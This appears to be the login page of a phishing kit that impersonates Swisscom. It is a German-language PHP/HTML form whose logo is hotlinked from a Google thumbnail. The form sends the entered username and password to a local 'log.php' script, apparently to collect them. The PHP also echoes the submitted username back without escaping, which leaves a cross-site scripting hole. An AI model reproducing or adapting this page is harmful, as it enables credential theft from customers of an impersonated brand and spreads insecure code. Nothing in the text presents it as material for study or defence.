<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<link rel="stylesheet" type="text/css" href="css/styles.css">
<link href="Swisscom Login" rel="shortcut icon">
</head>
<body ><div id="container">
		<div class="logo">
			<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQkHeZi0oZDpvyTuMjrJRq_Kp3x3EZWZ0NjQTUuff3aF-usna0e">
			<div class="header-wrapper">
				<h2 class="header-text">Swisscom Login</h2>
				<span>Melden Sie sich bitte mit Ihrem Benutzernamen an.</a></span>
			</div>
		</div>
		<div class="content">
			<div class="login-form">
				<form method="POST" action="log.php">
					<div class="input-fields">
						<?php echo $email_error !== "" ? '<div class="error user-error">'.$email_error.'</div>' : ""; ?>

						<?php 
							if($user_email == ""){
								$user = $_POST ? $_POST['username']:"";
								echo '<input type="text" lang="en" name="username" maxlength="113" class="login-data" placeholder="Benutzername" value="'.$user.'" name="username" />';
							} else{
								echo '<div class="known-user">'.$user_email.'</div>';
								echo '<input type="hidden" name="username" value="'.$user_email.'" />';
							}
						?>
						<?php echo $pass_error !== "" ? '<div class="error input-fields2">'.$pass_error.'</div>' : "";  ?>

						<input class="login-data" type="password" name="password" autocomplete="off" maxlength="127" placeholder="Passwort" />
					</div>

					<div class="input-checkbox">
						<input type="checkbox"><label>Angemeldet bleiben</label>
					</div>
					<div class="input-fields button-gap">
						<input class="btn-primary" type="submit" value="Anmelden" class="default">
					</div>
					<div class="input-fields forgot">
						<p>Sie haben noch kein Konto? <a href="#">Dann erstellen Sie jetzt eins!</a></p>
						<p><a href="#">Benutzername oder Passwort vergessen?</a></p>
			                        <p class="brand">Swisscom</p>
					</div>
				</form>
			</div>
		</div>
	</div>
</body>
</html>